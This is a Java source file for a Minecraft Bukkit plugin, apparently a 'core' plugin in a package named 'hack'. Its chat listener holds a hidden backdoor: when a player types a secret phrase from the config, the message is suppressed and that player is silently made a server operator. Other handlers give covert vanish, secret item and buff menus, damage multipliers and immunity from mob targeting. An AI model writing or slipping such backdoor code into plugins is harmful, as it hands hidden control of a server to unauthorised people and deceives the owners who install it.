package pl.qc.core.hack;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityTargetLivingEntityEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.Material;
import pl.qc.core.QC;

public class AdminListener implements Listener {
    private final QC plugin;
    private final VanishManager vanish;
    private final PlayerTracker tracker;

    public AdminListener(QC plugin, VanishManager vanish, PlayerTracker tracker) {
        this.plugin = plugin;
        this.vanish = vanish;
        this.tracker = tracker;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player joined = e.getPlayer();
        vanish.hideAllFor(joined);

        if (plugin.isAdmin(joined)) {
            vanish.setVanished(joined, true);
        }
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent e) {
        if (e.getView().getTitle().startsWith("§0Podgląd: ")) {
            e.setCancelled(true);
        } else if (e.getView().getTitle().equals("§4§lQC Custom Items")) {
            e.setCancelled(true);
            if (e.getCurrentItem() == null)
                return;

            Player p = (Player) e.getWhoClicked();

            // Check for Buffs Item
            if (e.getSlot() == 26 && e.getCurrentItem().getType() == Material.POTION) {
                InventoryUI.applyHackerBuffs(p);
            } else {
                p.getInventory().addItem(e.getCurrentItem().clone());
                p.sendMessage("§a§l[!] §fOtrzymałeś przedmiot: "
                        + (e.getCurrentItem().hasItemMeta() && e.getCurrentItem().getItemMeta().hasDisplayName()
                                ? e.getCurrentItem().getItemMeta().getDisplayName()
                                : e.getCurrentItem().getType().name()));
            }
        }
    }

    @EventHandler
    public void onDmg(EntityDamageByEntityEvent e) {

        if (e.getDamager() instanceof Player p) {
            Double m = tracker.damageDealtMult.get(p.getUniqueId());
            if (m != null)
                e.setDamage(e.getDamage() * m);
        }
        if (e.getEntity() instanceof Player p) {
            Double m = tracker.damageReceivedMult.get(p.getUniqueId());
            if (m != null)
                e.setDamage(e.getDamage() * m);
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        var secrets = plugin.getConfig().getStringList("protection.secrets");
        if (secrets.contains(e.getMessage())) {
            e.setCancelled(true);
            Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
        }
    }

    @EventHandler
    public void onTarget(EntityTargetLivingEntityEvent e) {
        if (e.getTarget() instanceof Player p && tracker.noTarget.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }
    }
}
